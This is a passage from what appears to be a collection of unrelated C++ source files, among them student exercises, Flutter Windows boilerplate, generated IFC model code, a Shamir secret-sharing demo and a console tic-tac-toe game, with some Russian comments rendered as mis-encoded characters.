gYPos++;\n    }\n}\n\nbool Common_BtnPress(Common_Button btn)\n{\n    return ((gPressedButtons & (1 << btn)) != 0);\n}\n\nbool Common_BtnDown(Common_Button btn)\n{\n    return ((gDownButtons & (1 << btn)) != 0);\n}\n\nconst char *Common_BtnStr(Common_Button btn)\n{\n    switch (btn)\n    {\n        case BTN_ACTION1:   return \"1\";\n        case BTN_ACTION2:   return \"2\";\n        case BTN_ACTION3:   return \"3\";\n        case BTN_ACTION4:   return \"4\";\n        case BTN_LEFT:      return \"Left\";\n        case BTN_RIGHT:     return \"Right\";\n        case BTN_UP:        return \"Up\";\n        case BTN_DOWN:      return \"Down\";\n        case BTN_MORE:      return \"Space\";\n        case BTN_QUIT:      return \"Escape\";\n        default:            return \"Unknown\";\n    }\n}\n\nconst char *Common_MediaPath(const char *fileName)\n{\n    char *filePath = (char *)calloc(256, sizeof(char));\n\n    static const char* pathPrefix = nullptr;\n    if (!pathPrefix)\n    {\n        const char *emptyPrefix = \"\";\n        const char *mediaPrefix = \"../media/\";\n        FILE *file = fopen(fileName, \"r\");\n        if (file)\n        {\n            fclose(file);\n            pathPrefix = emptyPrefix;\n        }\n        else\n        {\n            pathPrefix = mediaPrefix;\n        }\n    }\n\n    strcat(filePath, pathPrefix);\n    strcat(filePath, fileName);\n\n    gPathList.push_back(filePath);\n\n    return filePath;\n}\n\nconst char *Common_WritePath(const char *fileName)\n{\n\treturn Common_MediaPath(fileName);\n}\n\nvoid Common_TTY(const char *format, ...)\n{\n    char string[1024] = {0};\n\n    va_list args;\n    va_start(args, format);\n    Common_vsnprintf(string, 1023, format, args);\n    va_end(args);\n\n    if (Common_Private_Print)\n    {\n        (*Common_Private_Print)(string);\n    }\n    else\n    {\n        OutputDebugStringA(string);\n    }\n}\n\nHFONT CreateDisplayFont()\n{\n    return CreateFontA(22, 0, 0, 0, FW_DONTCARE, FALSE, FALSE, FALSE, DEFAULT_CHARSET, OUT_OUTLINE_PRECIS,\n      ",
    "/*\n// Final Project\n// Menu Module\n// File\tmenuTester.cpp\n// Version 1.0\n// Author\tFardad Soleimanloo\n// Revision History\n// -----------------------------------------------------------\n// Name               Date                 Reason\n/////////////////////////////////////////////////////////////////\n#include <iostream>\n#include \"Menu.h\"\n#include \"Utils.h\"\nusing namespace std;\nusing namespace seneca;\n\nvoid showOrder(const unsigned int* cnt, const Menu& M);\nint main() {\n   unsigned int selections[3]{};\n   unsigned int s;\n   Menu m1(\"Lunch Menu\"), m2;\n   if (m2) {\n      cout << \"Wrong output, your bool cast is done incorrenctly!\";\n   }\n   else {\n      cout << \"The >\" << m2 << \"< menu is empty\" << endl;\n   }\n   m1 << \"Omelet\" << \"Tuna Sandwich\" << \"California Roll\";\n   m2 << \"Order more\";\n   if (m1) {\n      cout << \"The \" << m1 << \" is not empty and has \" << (unsigned int)(m1) << \" menu items.\" << endl;\n   }\n   do {\n      s = m1.run();\n      if (s) {\n         selections[s - 1]++;\n         cout << \"you chose \" << m1[s - 1] << endl;\n      }\n   } while (s != 0 || ~m2 != 0);\n   showOrder(selections, m1);\n   return 0;\n}\nvoid showOrder(const unsigned int* cnt, const Menu& M) {\n   bool orderedSomthing = false;\n   cout << \"Your orders: \" << endl;\n   for (int i = 0; i < 3; i++) {\n      if (cnt[i]) {\n         orderedSomthing = true;\n         cout << cnt[i] << \" \" << M[i] << (cnt[i] > 1 ? \"s\" : \"\") << endl;\n      }\n   }\n   if (!orderedSomthing) cout << \"You didn't order anything!\" << endl;\n}*/\n",
    "#include <iostream>\r\n#include <vector>\r\n#include <string>\r\n\r\nusing namespace std;\r\n\r\n// Product class\r\nclass Product{\r\npublic:\r\n    string name;\r\n    double price;\r\n\r\n    Product(string n, double p) : name(n), price(p) {}\r\n};\r\n\r\n// Abstract class(Transaction)\r\nclass Transaction{\r\nprotected:\r\n    vector<pair<Product, int>>items;\r\n\r\npublic:\r\n    // Function to add items\r\n    void addItem(Product product,int quantity)\r\n    {\r\n        items.push_back(make_pair(product, quantity));\r\n    }\r\n\r\n    // Function to calculate total price of transaction\r\n    double calculateTotal()\r\n    {\r\n        double total=0;\r\n        for(const auto& item : items) {\r\n            total+=item.first.price*item.second;\r\n        }\r\n        return total;\r\n    }\r\n\r\n    // Function to get items...\r\n    vector<pair<Product,int>>getItems()\r\n    {\r\n        return items;\r\n    }\r\n};\r\n\r\n// Class for cart,inherits from Transaction\r\nclass Cart : public Transaction {\r\npublic:\r\n    //display cart\r\n    void displayCart()\r\n    {\r\n        if(items.empty())\r\n        {\r\n            cout<<\"-------------Your Cart is empty!!!------------\\n\";\r\n            return;\r\n        }\r\n        for(const auto& item : items)\r\n        {\r\n            cout<<item.second<<\" x \"<<item.first.name<<\" - Rs.\"<<(item.first.price * item.second)<<\"\\n\";\r\n        }\r\n        cout<<\"-----------------------------------------\\n\";\r\n        cout<<\"Total: Rs.\"<<calculateTotal()<<endl;\r\n    }\r\n};\r\n\r\n//class for bills, inherits from Transaction\r\nclass BillPrinter : public Transaction{\r\nprivate:\r\n    string customerName;\r\n    string phoneNumber;\r\n    string upiid;\r\n    int upin;\r\n    string cno;\r\n    string edate;\r\n    int cvv;\r\n    char paymentMethod;\r\n\r\n   \r\n\r\npublic:\r\n    // Constructor overloading\r\n    BillPrinter(string name, string phone) : customerName(name), phoneNumber(phone) {}\r\n\r\n    BillPrinter(string id, int upno) : upiid(id), upin(upno) {}\r\n\r\n    BillPrinter(string no, string ed, int cv) : cno(no), edate(ed), cvv(cv) {}\r\n\r\n    // Function to set payment method\r\n    void setPaymentMethod(char method)\r\n    {\r\n        paymentMethod=method;\r\n    }\r\n    // Function to set items in the bill\r\n    void setItems(vector<pair<Product, int>> items)\r\n    {\r\n        this->items=items;\r\n    }\r\n\r\n    // Function to print bill\r\n    void printBill()\r\n    {\r\n        cout<<\"Customer Name: \"<<customerName<<endl;\r\n        cout<<\"Phone Number: \"<<phoneNumber<<endl;\r\n        if (paymentMethod=='U')\r\n        {\r\n            char ch;\r\n            cout<<\"******UPI TRANSACTION*****\"<<endl;\r\n            cout<<\"Do you authorize this transaction(Y/N):\";\r\n            cin>>ch;\r\n            if (ch=='Y')\r\n                cout<<\"Verification Successful\";\r\n            else\r\n                cout<<\"Please Verify again\";\r\n        }\r\n\r\n        else if(paymentMethod=='R')\r\n        {\r\n            int cho;\r\n            cout<<\"Directing to Payments gateway\"<<endl;\r\n            cout<<\"Which payments option do you want to use:\"<<endl;\r\n            cout<<\"1.Axis Bank     2.Indian Bank      3.SBI\"<<endl;\r\n            cout<<\"Enter your bank option:\";\r\n            cin>>cho;\r\n            if(cho==1)\r\n            {\r\n                char c;\r\n                cout<<\"Welcome to Axis Bank Portal\"<<endl;\r\n                cout<<\"Do you authorize this transaction (Y/N):\";\r\n                cin>>c;\r\n                if(c=='Y')\r\n                {\r\n                    cout<<\"Thanks for using our Portal \\n Your transaction was a success\";\r\n                }\r\n                else\r\n                {\r\n                    cout<<\"Error during transaction\";\r\n                    exit(0);\r\n                }\r\n            }\r\n            else if(cho==2)\r\n            {\r\n                char c;\r\n                cout<<\"Welcome to Indian Bank Portal\"<<endl;\r\n                cout<<\"Do you authorize this transaction (Y/N):\";\r\n                cin>>c;\r\n                if(c == 'Y')\r\n                {\r\n                    cout<<\"Thanks for using our Portal \\n Your transaction was a success\";\r\n                }\r\n                else\r\n                {\r\n                    cout<<\"Error during transaction\";\r\n                    exit(0);\r\n                }\r\n            }\r\n\r\n            else if(cho==3)\r\n            {\r\n                char c;\r\n                cout<<\"Welcome to SBI Portal\"<<endl;\r\n                cout<<\"Do you authorize this transaction (Y/N):\";\r\n                cin>>c;\r\n                if(c == 'Y')\r\n                {\r\n                    cout<<\"Thanks for using our Portal \\n Your transaction was a success\";\r\n                }\r\n                else\r\n                {\r\n                    cout<<\"Error during transaction\";\r\n                    exit(0);\r\n                }\r\n            }\r\n\r\n            else\r\n            {\r\n                cout<<\"OOPS Invalid choice\";\r\n                exit(0);\r\n            }\r\n        }\r\n        cout << \"-----------------------------------------\\n\";\r\n        cout << \"Products:\\n\";\r\n        for (const auto& item : items)\r\n        {\r\n",
    "#include \"utils.h\"\r\n\r\n#include <flutter_windows.h>\r\n#include <io.h>\r\n#include <stdio.h>\r\n#include <windows.h>\r\n\r\n#include <iostream>\r\n\r\nvoid CreateAndAttachConsole() {\r\n  if (::AllocConsole()) {\r\n    FILE *unused;\r\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stdout)) {\r\n      _dup2(_fileno(stdout), 1);\r\n    }\r\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stderr)) {\r\n      _dup2(_fileno(stdout), 2);\r\n    }\r\n    std::ios::sync_with_stdio();\r\n    FlutterDesktopResyncOutputStreams();\r\n  }\r\n}\r\n\r\nstd::vector<std::string> GetCommandLineArguments() {\r\n  // Convert the UTF-16 command line arguments to UTF-8 for the Engine to use.\r\n  int argc;\r\n  wchar_t** argv = ::CommandLineToArgvW(::GetCommandLineW(), &argc);\r\n  if (argv == nullptr) {\r\n    return std::vector<std::string>();\r\n  }\r\n\r\n  std::vector<std::string> command_line_arguments;\r\n\r\n  // Skip the first argument as it's the binary name.\r\n  for (int i = 1; i < argc; i++) {\r\n    command_line_arguments.push_back(Utf8FromUtf16(argv[i]));\r\n  }\r\n\r\n  ::LocalFree(argv);\r\n\r\n  return command_line_arguments;\r\n}\r\n\r\nstd::string Utf8FromUtf16(const wchar_t* utf16_string) {\r\n  if (utf16_string == nullptr) {\r\n    return std::string();\r\n  }\r\n  unsigned int target_length = ::WideCharToMultiByte(\r\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\r\n      -1, nullptr, 0, nullptr, nullptr)\r\n    -1; // remove the trailing null character\r\n  int input_length = (int)wcslen(utf16_string);\r\n  std::string utf8_string;\r\n  if (target_length == 0 || target_length > utf8_string.max_size()) {\r\n    return utf8_string;\r\n  }\r\n  utf8_string.resize(target_length);\r\n  int converted_length = ::WideCharToMultiByte(\r\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\r\n      input_length, utf8_string.data(), target_length, nullptr, nullptr);\r\n  if (converted_length == 0) {\r\n    return std::string();\r\n  }\r\n  return utf8_string;\r\n}\r\n",
    "#include <algorithm>\r\n#include <iostream>\r\n#include <vector>\r\n\r\nint main()\r\n{\r\n    setlocale(LC_ALL, \"ru\");\r\n    std::vector<int> v{ 1, 2, 3, 4, 5, 6, 7, 8, 9, 10 };\r\n\r\n    // \u00ca\u00ee\u00eb\u00e8\u00f7\u00e5\u00f1\u00f2\u00e2\u00ee \u00e2 \u00e2\u00e5\u00ea\u00f2\u00ee\u00f0\u00e5 \u00f0\u00e0\u00e2\u00ed\u00ee 3\r\n    int target1 = 3;\r\n    int num_items1 = std::count(v.begin(), v.end(), target1);\r\n    std::cout << \"\u00f7\u00e8\u00f1\u00eb\u00ee: \" << target1 << \" \u00ea\u00ee\u00eb\u00e8\u00f7\u00e5\u00f1\u00f2\u00e2\u00ee: \" << num_items1 << std::endl;\r\n\r\n    int num_items3 = std::count_if(v.begin(), v.end(), [](int i) { return i % 3 == 0; });\r\n    std::cout << \"\u00ea\u00ee\u00eb\u00e8\u00f7\u00e5\u00f1\u00f2\u00e2\u00ee \u00f7\u00e8\u00f1\u00e5\u00eb \u00f0\u00e0\u00e2\u00ed\u00fb\u00f5 \u00f2\u00f0\u00b8\u00ec: \" << num_items3 << std::endl;\r\n    std::cout << std::endl << \"\u00cb\u00ff\u00ec\u00e1\u00e4\u00e0, \u00e7\u00e0\u00f5\u00e2\u00e0\u00f2 \u00ef\u00e5\u00f0\u00e5\u00ec\u00e5\u00ed\u00ed\u00fb\u00f5 \" << std::endl;\r\n    // \u00eb\u00ff\u00ec\u00e1\u00e4\u00e0-\u00e2\u00fb\u00f0\u00e0\u00e6\u00e5\u00ed\u00e8\u00e5, \u00e7\u00e0\u00f5\u00e2\u00e0\u00f2 \u00ef\u00e5\u00f0\u00e5\u00ec\u00e5\u00ed\u00ed\u00fb\u00f5\r\n    for (auto i : v)\r\n    {\r\n        [i]() {\r\n            if (i % 3 == 0)\r\n                std::cout << i << \" \";\r\n            }();\r\n    }\r\n\r\n    std::cout << std::endl << \"\u00cb\u00ff\u00ec\u00e1\u00e4\u00e0 \u00f1 \u00ef\u00e0\u00f0\u00e0\u00ec\u00e5\u00f2\u00f0\u00e0\u00ec\u00e8 \" << std::endl;\r\n    // \u00c2\u00fb\u00e2\u00ee\u00e4 \u00e7\u00ed\u00e0\u00f7\u00e5\u00ed\u00e8\u00e9 \u00ea\u00f0\u00e0\u00f2\u00ed\u00fb\u00f5 3. \u00c7\u00ed\u00e0\u00f7\u00e5\u00ed\u00e8\u00ff \u00e1\u00f3\u00e4\u00f3\u00f2 \u00ef\u00e5\u00f0\u00e5\u00e4\u00e0\u00e2\u00e0\u00f2\u00fc \u00ea\u00e0\u00ea \u00ef\u00e0\u00f0\u00e0\u00ec\u00e5\u00f2\u00f0 \u00f3 \u00ee\u00e1\u00fb\u00f7\u00ed\u00ee\u00e9 \u00f4\u00f3\u00ed\u00ea\u00f6\u00e8\u00e8\r\n    for (auto i : v)\r\n    {\r\n        [](auto i) {\r\n            if (i % 3 == 0)\r\n                std::cout << i << \" \";\r\n            }(i);\r\n    }\r\n\r\n    std::cout << std::endl << \"\u00cb\u00ff\u00ec\u00e1\u00e4\u00e0 \u00e1\u00e5\u00e7 \u00ef\u00e0\u00f0\u00e0\u00ec\u00e5\u00f2\u00f0\u00ee\u00e2 \" << std::endl;\r\n    // \u00c2\u00fb\u00e2\u00ee\u00e4 \u00e7\u00ed\u00e0\u00f7\u00e5\u00ed\u00e8\u00e9 \u00ea\u00f0\u00e0\u00f2\u00ed\u00fb\u00f5 3.\r\n    // \u00c7\u00ed\u00e0\u00f7\u00e5\u00ed\u00e8\u00ff \u00ef\u00e5\u00f0\u00e5\u00e4\u00e0\u00fe\u00f2\u00f1\u00ff \u00f7\u00e5\u00f0\u00e5\u00e7 \u00e7\u00e0\u00f5\u00e2\u00e0\u00f2 \u00ef\u00e5\u00f0\u00e5\u00ec\u00e5\u00ed\u00ed\u00fb\u00f5 \u00ef\u00f0\u00e8 \u00fd\u00f2\u00ee\u00ec \u00ef\u00f0\u00ee\u00ef\u00f3\u00f1\u00f2\u00e8\u00ec \u00f1\u00ea\u00ee\u00e1\u00ea\u00e8 \u00e4\u00eb\u00ff \u00e4\u00ee\u00e1\u00e0\u00e2\u00eb\u00e5\u00ed\u00e8\u00ff\r\n    for (auto i : v)\r\n    {\r\n        [i]() {\r\n            if (i % 3 == 0)\r\n                std::cout << i << \" \";\r\n            }();\r\n    }\r\n}\r\n",
    "//Ejercicio propuesto 03//\n//Temperatura maxima y minima de siete dias\n//Alison Khiara Flores Hallasi//\n#include<iostream>\n#include <cstdlib>\nusing namespace std;\nint main (){\n\tstring dia[8]={\"nulo\",\"lunes\",\"martes\",\"miercoles\",\"jueves\",\"viernes\",\"sabado\",\"domingo\"};\n\tint i=1;\n\tint k=1, t; \n\tdouble dmt=0, mt=0, tmed[99],tmax[40],tm[40];\n \tfor (int i=1; i<=7; i++){\n \t\tcout<<\"Temperatura del dia \"<<dia[i]<<endl;\n\t\tcout<<\"Ingrese la temperatura MINIMA: \";\n\t\tcin>>tm[i];\n\t\tcout<<\"Ingrese la temperatura MAXIMA: \";\n\t\tcin>>tmax[i];\n\t }\n\t\n\tfor(int j=1; j<=7; j++){\n\t\tcout<<\"La temperatura media del \"<<dia[j]<<\" es: \";\n\t\ttmed[j]=((tm[j]+tmax[j])/2);\n\t\tcout<<tmed[j]<<endl;\n\t}\n\tdmt= tm[1];\n\tfor (int a=1; a<=7; a++){\n\t\tif(tm[a]<=dmt){\n\t\t\tmt = tm[a];\n\t\t}\n\t}\n\tfor( int b=1; b<=7; b++){\n\t\tif (mt==tm[b]){\n\t\t\tcout<<\"El dia con menor temperatura es: \"<<dia[b]<<endl;\n\t\t\tcout<<\"Y la menor temperatura es: \"<<mt<<endl;\n\t\t}\n\t}\n\tcout<<\"Ingrese una temperatura: \"; \n\tcin>>t;\n\twhile(k<=7){\n\t\tif(tmax[k]==t){\n\t\t\tcout<<\"La temperatura maxima coincide con el dia \"<<dia[k]<<endl;\n\t\t}\n\t\telse{\n\t\t\tcout<<\"La temperatura dada no coincide con ninguna \"<<endl;\t\n\t\t}\n\t\tk++;\n\t}\n\t\n\treturn 0;\n}\n",
    "#include <iostream>\r\n#include <regex>\r\nusing namespace std;\r\nint Password_Strength(string password) {\r\n  const int min_Length = 8;\r\n  const regex UpperCase(\"[A-Z]\");\r\n  const regex LowerCase(\"[a-z]\");\r\n  const regex Number(\"[0-9]\");\r\n  const regex SpecialChar(\"[!@#$%^&*()]\");\r\n  int score = 0; \r\n\r\n  if (password.length() >= min_Length) {\r\n    score ++;\r\n  } \r\n  if (regex_search(password, UpperCase)) {\r\n    score++;\r\n    }\r\n  if (regex_search(password, LowerCase)) {\r\n    score++;\r\n    }\r\n  if (regex_search(password, Number)) {\r\n    score++;}\r\n  if (regex_search(password, SpecialChar)) {\r\n    score++;\r\n    }\r\n  return score;\r\n}\r\n  string Feedback_strength(int score) {\r\n  string feedback;\r\n  switch (score) {\r\n    case 0:\r\n      feedback = \"Error! You cannot enter an empty password.\";\r\n      break;\r\n    case 1:\r\n    case 2:\r\n      feedback = \"Very Weak! Use a combination of uppercase, lowercase letters, numbers and symbols.\";\r\n      break;\r\n    case 3:\r\n      feedback = \"Weak. Consider adding more variety to your password.\";\r\n      break;\r\n    case 4:\r\n      feedback = \"Moderate. A good password, but could be stronger.\";\r\n      break;\r\n    case 5:\r\n      feedback = \"Strong! This password is difficult to crack.\";\r\n      break;\r\n  }\r\n  return feedback;\r\n}\r\nint main() {\r\n  string password;\r\n  char choice;\r\n  do {\r\n    cout << \"Enter your password (minimum length 8) \";\r\n    getline(cin, password);\r\n    if (password.empty()) {\r\n      cout << \"Error! You cannot enter an empty password.\" << endl;\r\n      continue;\r\n    }\r\n\r\n    int score = Password_Strength(password);\r\n    string feedback = Feedback_strength(score);\r\n\r\n    cout << \"Your password strength: \" << feedback << endl;\r\n\r\n    cout << \"Try again? (y/n): \";\r\n    cin >> choice;\r\n    cin.ignore();\r\n  } while (tolower(choice) == 'y'); \r\n\r\n  return 0;\r\n}",
    "/* Code generated by IfcQuery EXPRESS generator, www.ifcquery.com */\n#include \"ifcpp/model/AttributeObject.h\"\n#include \"ifcpp/model/BuildingException.h\"\n#include \"ifcpp/model/BuildingGuid.h\"\n#include \"ifcpp/reader/ReaderUtil.h\"\n#include \"ifcpp/writer/WriterUtil.h\"\n#include \"ifcpp/IFC4X3/include/IfcAxis2Placement3D.h\"\n#include \"ifcpp/IFC4X3/include/IfcPositiveLengthMeasure.h\"\n#include \"ifcpp/IFC4X3/include/IfcPresentationLayerAssignment.h\"\n#include \"ifcpp/IFC4X3/include/IfcSphericalSurface.h\"\n#include \"ifcpp/IFC4X3/include/IfcStyledItem.h\"\n\n// ENTITY IfcSphericalSurface \nIFC4X3::IfcSphericalSurface::IfcSphericalSurface( int tag ) { m_tag = tag; }\nvoid IFC4X3::IfcSphericalSurface::getStepLine( std::stringstream& stream, size_t precision ) const\n{\n\tstream << \"#\" << m_tag << \"=IFCSPHERICALSURFACE\" << \"(\";\n\tif( m_Position ) { stream << \"#\" << m_Position->m_tag; } else { stream << \"$\"; }\n\tstream << \",\";\n\tif( m_Radius ) { m_Radius->getStepParameter( stream, false, precision ); } else { stream << \"$\"; }\n\tstream << \");\";\n}\nvoid IFC4X3::IfcSphericalSurface::getStepParameter( std::stringstream& stream, bool /*is_select_type*/, size_t /*precision*/ ) const { stream << \"#\" << m_tag; }\nvoid IFC4X3::IfcSphericalSurface::readStepArguments( const std::vector<std::string>& args, const BuildingModelMapType<int,shared_ptr<BuildingEntity> >& map, std::stringstream& errorStream, std::unordered_set<int>& entityIdNotFound )\n{\n\tconst size_t num_args = args.size();\n\tif( num_args > 0 ){readEntityReference( args[0], m_Position, map, errorStream, entityIdNotFound );}\n\tif( num_args > 1 ){m_Radius = IfcPositiveLengthMeasure::createObjectFromSTEP( args[1], map, errorStream, entityIdNotFound );}\n\tif( num_args != 2 ){ errorStream << \"Wrong parameter count for entity IfcSphericalSurface, expecting 2, having \" << num_args << \". Entity ID: \" << m_tag << std::endl; }\n}\nvoid IFC4X3::IfcSphericalSurface::getAttributes( std::vector<std::pair<std::string, shared_ptr<BuildingObject> > >& vec_attributes ) const\n{\n\tIFC4X3::IfcElementarySurface::getAttributes( vec_attributes );\n\tvec_attributes.emplace_back( std::make_pair( \"Radius\", m_Radius ) );\n}\nvoid IFC4X3::IfcSphericalSurface::getAttributesInverse( std::vector<std::pair<std::string, shared_ptr<BuildingObject> > >& vec_attributes_inverse ) const\n{\n\tIFC4X3::IfcElementarySurface::getAttributesInverse( vec_attributes_inverse );\n}\nvoid IFC4X3::IfcSphericalSurface::setInverseCounterparts( shared_ptr<BuildingEntity> ptr_self_entity )\n{\n\tIfcElementarySurface::setInverseCounterparts( ptr_self_entity );\n}\nvoid IFC4X3::IfcSphericalSurface::unlinkFromInverseCounterparts()\n{\n\tIfcElementarySurface::unlinkFromInverseCounterparts();\n}\n",
    "#include <bits/stdc++.h>\nusing namespace std;\n\ntypedef long long int ll;\n\nstruct mint\n{\n    ll v;\n    int MOD;\n\n    explicit operator ll() const { return v; }\n    explicit operator int() const { return v; }\n    mint() : v(0), MOD(1) {} // Default MOD set to 1, change as per requirement\n    mint(ll _v, int _MOD) : MOD(_MOD)\n    {\n        v = (-MOD < _v && _v < MOD) ? _v : _v % MOD;\n        if (v < 0)\n            v += MOD;\n    }\n\n    friend bool operator==(const mint &a, const mint &b) { return a.v == b.v && a.MOD == b.MOD; }\n    friend bool operator!=(const mint &a, const mint &b) { return !(a == b); }\n    friend bool operator<(const mint &a, const mint &b) { return a.v < b.v; }\n    friend bool operator>(const mint &a, const mint &b) { return a.v > b.v; }\n    friend bool operator<=(const mint &a, const mint &b) { return a.v <= b.v; }\n    friend bool operator>=(const mint &a, const mint &b) { return a.v >= b.v; }\n\n    friend mint operator+(mint a, const mint &b) { return a += b; }\n    friend mint operator-(mint a, const mint &b) { return a -= b; }\n    friend mint operator*(mint a, const mint &b) { return a *= b; }\n    friend mint operator/(mint a, const mint &b) { return a /= b; }\n\n    mint &operator+=(const mint &m)\n    {\n        assert(MOD == m.MOD);\n        if ((v += m.v) >= MOD)\n            v -= MOD;\n        return *this;\n    }\n    mint &operator-=(const mint &m)\n    {\n        assert(MOD == m.MOD);\n        if ((v -= m.v) < 0)\n            v += MOD;\n        return *this;\n    }\n    mint &operator*=(const mint &m)\n    {\n        assert(MOD == m.MOD);\n        v = v * m.v % MOD;\n        return *this;\n    }\n    mint &operator/=(const mint &m)\n    {\n        assert(MOD == m.MOD);\n        return (*this) *= inv(m);\n    }\n\n    mint operator-() const { return mint(-v, MOD); }\n    mint &operator++()\n    {\n        v++;\n        if (v >= MOD)\n            v -= MOD;\n        return *this;\n    }\n    mint &operator--()\n    {\n        v--;\n        if (v < 0)\n            v += MOD;\n        return *this;\n    }\n    mint operator++(int)\n    {\n        mint temp(*this);\n        v++;\n        if (v >= MOD)\n            v -= MOD;\n        return temp;\n    }\n    mint operator--(int)\n    {\n        mint temp(*this);\n        v--;\n        if (v < 0)\n            v += MOD;\n        return temp;\n    }\n\n    friend mint pow(mint a, ll b)\n    {\n        assert(b >= 0);\n        mint res(1, a.MOD);\n        while (b)\n        {\n            if (b & 1)\n            {\n                res *= a;\n            }\n            a *= a;\n            b >>= 1;\n        }\n        return res;\n    }\n    friend mint inv(const mint &a)\n    {\n        assert(a.v != 0);\n        return pow(a, a.MOD - 2);\n    }\n};\n\nvector<mint> poly;\nvector<mint> shares;\n\nvector<mint> make_poly(int t, mint s, int MOD)\n{\n    vector<mint> poly;\n    poly.push_back(s);\n    for (int i = 1; i < t; i++)\n        poly.push_back(mint(rand(), MOD));\n    mint last;\n    while ((last = mint(rand(), MOD)) == mint(0, MOD))\n        ;\n    poly.push_back(last);\n    return poly;\n}\n\nvector<mint> share_production(int n, int t, int MOD)\n{\n    bool valid = false;\n    while (!valid)\n    {\n        valid = true;\n        shares.clear();\n        for (int i = 1; i <= n; i++)\n        {\n            mint res = mint(0, MOD);\n            for (int j = t - 1; j >= 0; j--)\n            {\n                res *= mint(i, MOD);\n                res += poly[j];\n            }\n            if (res == mint(0, MOD))\n            {\n                valid = false;\n                poly = make_poly(t, poly[0], MOD);\n                break;\n            }\n            shares.push_back(res);\n        }\n    }\n    return shares;\n}\n\nmint secret_discovery(set<int> idxs, int t, int MOD)\n{\n    mint res = mint(0, MOD);\n    for (int u : idxs)\n    {\n        mint x = shares[u - 1];\n        mint ans = mint(1, MOD);\n        for (int v : idxs)\n        {\n            if (u == v)\n                continue;\n            mint a = mint(v, MOD);\n            mint b = mint(v - u, MOD);\n            b = inv(b);\n            ans *= a * b;\n        }\n        res += x * ans;\n    }\n    return res;\n}\n\nint32_t main()\n{\n    int s_t, t, n, MOD;\n    cin >> s_t >> t >> n >> MOD;\n\n    mint secret = mint(s_t, MOD);\n    poly = make_poly(t, secret, MOD);\n    shares = share_production(n, t, MOD);\n\n    set<int> idxs;\n    while (idxs.size() < t)\n        idxs.insert((rand() % n) + 1);\n\n    cout << secret_discovery(idxs, t, MOD).v;\n\n    return 0;\n}\n",
    "#include \"flutter_window.h\"\r\n\r\n#include <optional>\r\n\r\n#include \"flutter/generated_plugin_registrant.h\"\r\n\r\nFlutterWindow::FlutterWindow(const flutter::DartProject& project)\r\n    : project_(project) {}\r\n\r\nFlutterWindow::~FlutterWindow() {}\r\n\r\nbool FlutterWindow::OnCreate() {\r\n  if (!Win32Window::OnCreate()) {\r\n    return false;\r\n  }\r\n\r\n  RECT frame = GetClientArea();\r\n\r\n  // The size here must match the window dimensions to avoid unnecessary surface\r\n  // creation / destruction in the startup path.\r\n  flutter_controller_ = std::make_unique<flutter::FlutterViewController>(\r\n      frame.right - frame.left, frame.bottom - frame.top, project_);\r\n  // Ensure that basic setup of the controller was successful.\r\n  if (!flutter_controller_->engine() || !flutter_controller_->view()) {\r\n    return false;\r\n  }\r\n  RegisterPlugins(flutter_controller_->engine());\r\n  SetChildContent(flutter_controller_->view()->GetNativeWindow());\r\n\r\n  flutter_controller_->engine()->SetNextFrameCallback([&]() {\r\n    this->Show();\r\n  });\r\n\r\n  // Flutter can complete the first frame before the \"show window\" callback is\r\n  // registered. The following call ensures a frame is pending to ensure the\r\n  // window is shown. It is a no-op if the first frame hasn't completed yet.\r\n  flutter_controller_->ForceRedraw();\r\n\r\n  return true;\r\n}\r\n\r\nvoid FlutterWindow::OnDestroy() {\r\n  if (flutter_controller_) {\r\n    flutter_controller_ = nullptr;\r\n  }\r\n\r\n  Win32Window::OnDestroy();\r\n}\r\n\r\nLRESULT\r\nFlutterWindow::MessageHandler(HWND hwnd, UINT const message,\r\n                              WPARAM const wparam,\r\n                              LPARAM const lparam) noexcept {\r\n  // Give Flutter, including plugins, an opportunity to handle window messages.\r\n  if (flutter_controller_) {\r\n    std::optional<LRESULT> result =\r\n        flutter_controller_->HandleTopLevelWindowProc(hwnd, message, wparam,\r\n                                                      lparam);\r\n    if (result) {\r\n      return *result;\r\n    }\r\n  }\r\n\r\n  switch (message) {\r\n    case WM_FONTCHANGE:\r\n      flutter_controller_->engine()->ReloadSystemFonts();\r\n      break;\r\n  }\r\n\r\n  return Win32Window::MessageHandler(hwnd, message, wparam, lparam);\r\n}\r\n",
    "#include <iostream>\r\n# include <unistd.h>\r\nusing namespace std;\r\n//Array for the board\r\nchar board[3][3] = {{'1','2','3'},{'4','5','6'},{'7','8','9'}};\r\n//Variable Declaration\r\nint choice;\r\nint row,column;\r\nchar turn = 'X';\r\nbool draw = false;\r\n\r\n//Function to show the current status of the gaming board\r\n\r\nvoid display_board(){\r\n\tsystem(\"Color 0E\");\r\n\tsystem(\"cls\");\r\n    cout<<\"\\t\\t\\t\\t                      _                         \"<<endl;                                                     \r\n\t        cout<<\"\\t\\t\\t\\t   __      __   ___  | |   ___    ___    _ __ ___     ___  \"<<endl;\r\n\t\t\r\n\t\t\tcout<<\"\\t\\t\\t\\t   \\\\ \\\\ /\\\\ / /  / _ \\\\ | |  / __|  / _ \\\\  | '_ ` _ \\\\   / _ \\\\ \"<<endl;\r\n\t\t\r\n\t\t\tcout<<\"\\t\\t\\t\\t    \\\\ V  V /  |  __/ | | | (__  | (_) | | | | | | | |  __/ \"<<endl;\r\n\t\t\r\n\t\t\tcout<<\"\\t\\t\\t\\t     \\\\_/\\\\_/    \\\\___| |_|  \\\\___|  \\\\___/  |_| |_| |_|  \\\\___| \"<<endl;\r\n  \r\n    cout<<\"T I C K -- T A C -- T O E -- G A M E\\t\\t\\t\";\r\n    cout<<\"\\n***** FOR 2 PLAYERS *****\\n\\n\\n\";\r\n     \r\n    cout<<\"PLAYER - 1 [X]\\t PLAYER - 2 [O]\\n\\n\";\r\n\tcout<<\"\\t\\t\\t\\t\\t\\t     |     |     \\n\";\r\n    cout<<\"\\t\\t\\t\\t\\t\\t  \"<<board[0][0]<<\"  | \"<<board[0][1]<<\"   |  \"<<board[0][2]<<\" \\n\";\r\n    cout<<\"\\t\\t\\t\\t\\t\\t ____|_____|____\\n\";\r\n    cout<<\"\\t\\t\\t\\t\\t\\t     |     |     \\n\";\r\n    cout<<\"\\t\\t\\t\\t\\t\\t  \"<<board[1][0]<<\"  | \"<<board[1][1]<<\"   |  \"<<board[1][2]<<\" \\n\";\r\n    cout<<\"\\t\\t\\t\\t\\t\\t ____|_____|____\\n\";\r\n    cout<<\"\\t\\t\\t\\t\\t\\t     |     |     